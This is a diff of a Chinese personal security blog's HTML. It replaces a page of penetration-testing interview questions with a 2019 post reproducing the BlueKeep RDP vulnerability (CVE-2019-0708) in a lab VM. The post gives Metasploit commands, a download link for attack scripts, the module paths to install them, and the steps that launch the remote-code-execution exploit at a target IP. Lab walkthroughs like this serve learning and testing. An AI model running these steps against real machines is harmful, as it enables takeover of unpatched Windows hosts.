@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>Sunian&#39;s Blog</title>
-  <meta name="keywords" content>
-  <meta name="description" content="Sunian&#39;s Blog">
+  <title>&#39;bluekeep漏洞复现&#39; | Sunian&#39;s Blog</title>
+  <meta name="keywords" content=" 漏洞复现 ">
+  <meta name="description" content="&#39;bluekeep漏洞复现&#39; | Sunian&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="个人简历素念，男，19岁 现读于某大专院校，汽修专业，自学web安全 专注于研究渗透测试方向 web安全，内网，硬件，社工等 联系方式QQ：3504078815 邮箱：lingyu195@gmail.com">
 <meta property="og:type" content="website">
@@ -52,7 +52,7 @@
 </div>
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/imgss/touxiang.jpg" />
@@ -681,12 +681,55 @@
         </div>
     </div>
 </aside>
-<div class="post index">
+<div class="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-bluekeep" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#记一次360笔试题"><span class="toc-text">记一次360笔试题</span></a></li></ol>
+        <h1 class="article-title">&#39;bluekeep漏洞复现&#39;</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a href="javascript:" data-rel="漏洞复现">漏洞复现</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color5">漏洞复现</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-09-11 19:00:07'>2019-09-11 19:00</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#准备工作"><span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#打开kali"><span class="toc-text">打开kali</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#启动神器msfconsole"><span class="toc-text">启动神器msfconsole</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -699,33 +742,47 @@
     }
 </style>
 </div>
-            <h3 id="记一次360笔试题"><a href="#记一次360笔试题" class="headerlink" title="记一次360笔试题"></a>记一次360笔试题</h3><ol>
-<li><p>如果存在SQL注入怎么判断不同的数据库。</p>
-</li>
-<li><p>简述下浏览器的自解码机制。</p>
-</li>
-<li><p>拿到目标站怎么进行渗透，需要注意什么。</p>
-</li>
-<li><p>CSRF漏洞的原理是什么？怎么修复？</p>
-</li>
-<li><p>代码审计怎么做？</p>
-</li>
-<li><p>哪些漏洞是WAF不能防御的？请举出至少三类漏洞。</p>
-</li>
-<li><p>考虑以下场景：一个多用户的博客系统（类似于CSDN），普通用户登陆到个人中心后，发现删除自己某篇文章所请求的URI为delete.php?article_id=24，请考虑这个地方最有可能出现哪些安全问题？</p>
-</li>
-<li><p>PHP5环境下，如果配置文件中magic_quotes_gpc为On，则PHP会对请求参数中的哪些字符进行自动转义？</p>
-</li>
-<li><p>使用sqlmap工具进行sql注入漏洞利用时，可以尝试使用（）选项获取一个操作系统shell。</p>
-</li>
-<li><p>渗透时后端环境是apache+php+mysql的情况下，利用sql注入写webshell一般来说需要满足三个条件：1.mysql用户需要有（）权限；2.需要知道（）路径；3.（）（符号）不能被过滤。</p>
-</li>
-</ol>
-<p>欢迎加入知识星球，获取参考答案及更多渗透资料<br><img src="/imgss/tu52.png" alt=""></p>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>打开虚拟机<br>开启远程桌面连接<br><img src="/imgss/%E5%9B%BE%E7%89%8735.jpg" alt><br>查看3389端口是否打开<br><img src="/imgss/%E5%9B%BE%E7%89%8736.jpg" alt><br>修改注册表（win键+R 搜索regedit打开注册表）<br>[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\RDP-Tcp\fDisableCam]值修改为0才能稳定利用</p>
+<h3 id="打开kali"><a href="#打开kali" class="headerlink" title="打开kali"></a>打开kali</h3><p>vi etc/apt/sources.list添加国内源（我这里添加的是阿里云的）<br><img src="/imgss/%E5%9B%BE%E7%89%8737.jpg" alt><br>执行更新和下载msf<br>apt-get update<br>apt-get install metasploit-framework<br>（出问题请尝试修复apt –fix-broken install）</p>
+<h3 id="启动神器msfconsole"><a href="#启动神器msfconsole" class="headerlink" title="启动神器msfconsole"></a>启动神器msfconsole</h3><p>search 0708<br>查看是否存在cve_2019_0708_bluekeep漏洞利用<br><img src="/imgss/%E5%9B%BE%E7%89%8738.jpg" alt></p>
+<p>准备攻击工具<br><a href="https://pan.baidu.com/s/1q-mbYQFtU1GBuJfThMk8VQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1q-mbYQFtU1GBuJfThMk8VQ</a> 提取码: mffr</p>
+<p>把脚本放在msf对应的目录下<br><img src="/imgss/%E5%9B%BE%E7%89%8739.jpg" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">rdp_scanner.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">cve_2019_0708_bluekeep.rb -&gt;</span><br><span class="line">/usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line"></span><br><span class="line">cve_2019_0708_bluekeep_rce.rb -&gt;   </span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb(该文件目录不存在需要自己新建)</span><br></pre></td></tr></table></figure>
 
-        </article>
-        
-        
+<p>将文件一一放到指定位置</p>
+<p>使用msfconsole进入metasploit-framework<br>进入以后使用reload_all重新加载0708rdp利用模块<br>使用use exploit/windows/rdp/cve_2019_0708_bluekeep_rce启用0708RDP攻击模块<br>set rhosts           设置靶机ip<br>set target id(0-4)   设置受害机及其架构<br>exploit              开始攻击，等待建立连接<br><img src="/imgss/%E5%9B%BE%E7%89%8740.jpg" alt></p>
+<p>参考链接：<a href="https://mp.weixin.qq.com/s/4s7UkJXKaD3iSvOB2M_CWQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/4s7UkJXKaD3iSvOB2M_CWQ</a></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在QQ私聊我，也可以邮件至 lingyu195@gmail.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>&#39;bluekeep漏洞复现&#39;</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="素念">素念</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-09-11, 19:00:12</p>
+    <p><span class="copy-title">最后更新:</span>2019-09-11, 19:00:07</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/09/11/bluekeep/" title="&#39;bluekeep漏洞复现&#39;">http://yoursite.com/2019/09/11/bluekeep/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">©2016-2019 sunian</p>
